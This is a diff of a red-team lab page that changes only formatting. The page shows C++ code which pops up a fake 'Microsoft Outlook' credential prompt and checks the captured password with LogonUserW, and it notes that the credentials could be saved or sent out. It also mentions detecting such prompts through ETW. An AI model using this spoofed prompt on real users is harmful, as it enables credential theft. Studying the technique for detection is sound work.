@@ -21,44 +21,44 @@ It is possible to collect user credentials with the below code:
 
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
-	CREDUI_INFO ci = { sizeof(ci) };
-	std::wstring promptCaption = L"Microsoft Outlook";
-	std::wstring promptMessage = L"Connecting to spotless@offense.local";
-	ci.pszCaptionText = (PCWSTR)promptCaption.c_str();
-	ci.pszMessageText = (PCWSTR)promptMessage.c_str();
+    CREDUI_INFO ci = { sizeof(ci) };
+    std::wstring promptCaption = L"Microsoft Outlook";
+    std::wstring promptMessage = L"Connecting to spotless@offense.local";
+    ci.pszCaptionText = (PCWSTR)promptCaption.c_str();
+    ci.pszMessageText = (PCWSTR)promptMessage.c_str();
 
-	WCHAR username[255] = {};
-	WCHAR password[255] = {};
-	DWORD result = 0;
+    WCHAR username[255] = {};
+    WCHAR password[255] = {};
+    DWORD result = 0;
 
-	result = CredUIPromptForCredentialsW(&ci, L".", NULL, 5, username, 255, password, 255, FALSE, CREDUI_FLAGS_GENERIC_CREDENTIALS);
-	if (result == ERROR_SUCCESS)
-	{
-		HANDLE newToken = NULL;
-		BOOL credentialsValid = FALSE;
+    result = CredUIPromptForCredentialsW(&ci, L".", NULL, 5, username, 255, password, 255, FALSE, CREDUI_FLAGS_GENERIC_CREDENTIALS);
+    if (result == ERROR_SUCCESS)
+    {
+        HANDLE newToken = NULL;
+        BOOL credentialsValid = FALSE;
 
-		credentialsValid = LogonUserW(username, NULL, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &newToken);
-		if (credentialsValid)
-		{
-			// valid credentials provided
-		}
-		else
-		{
-			// invalid credentials provided
-		}
-	}
-	else if (result == ERROR_CANCELLED)
-	{
-		// no credentials provided
-	}
+        credentialsValid = LogonUserW(username, NULL, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &newToken);
+        if (credentialsValid)
+        {
+            // valid credentials provided
+        }
+        else
+        {
+            // invalid credentials provided
+        }
+    }
+    else if (result == ERROR_CANCELLED)
+    {
+        // no credentials provided
+    }
 
-	return 0;
+    return 0;
 }
 ```
 {% endcode %}
 
 {% hint style="warning" %}
-Although in this lab I am using `CredUIPromptForCredentials` for invoking credentials prompt, you should be using  [`CredUIPromptForWindowsCredentials`](https://docs.microsoft.com/windows/desktop/api/wincred/nf-wincred-creduipromptforwindowscredentialsa)
+Although in this lab I am using `CredUIPromptForCredentials` for invoking credentials prompt, you should be using [`CredUIPromptForWindowsCredentials`](https://docs.microsoft.com/windows/desktop/api/wincred/nf-wincred-creduipromptforwindowscredentialsa)
 {% endhint %}
 
 If we compile and run the above code, we get a credential prompt, that captures user's credentials in plain text, which we could then save to a file or send out over the internet:
@@ -66,7 +66,7 @@ If we compile and run the above code, we get a credential prompt, that captures 
 ![](../../.gitbook/assets/image%20%28574%29.png)
 
 {% hint style="info" %}
-The above credential prompt can also be invoked with  PowerShell cmdlet `Get-Credential`.
+The above credential prompt can also be invoked with PowerShell cmdlet `Get-Credential`.
 {% endhint %}
 
 ## Detecting Credential Prompts
@@ -131,9 +131,9 @@ Below shows RogueCredentialsPrompt.exe and Powershell.exe invoking Windows crede
 
 ## References
 
-{% embed url="https://ired.team/miscellaneous-reversing-forensics/etw-event-tracing-for-windows-101" %}
+{% embed url="https://ired.team/miscellaneous-reversing-forensics/etw-event-tracing-for-windows-101" caption="" %}
 
-{% embed url="https://github.com/zodiacon/DotNextSP2019/" %}
+{% embed url="https://github.com/zodiacon/DotNextSP2019/" caption="" %}
 
-{% embed url="https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-creduipromptforcredentialsa" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-creduipromptforcredentialsa" caption="" %}
 
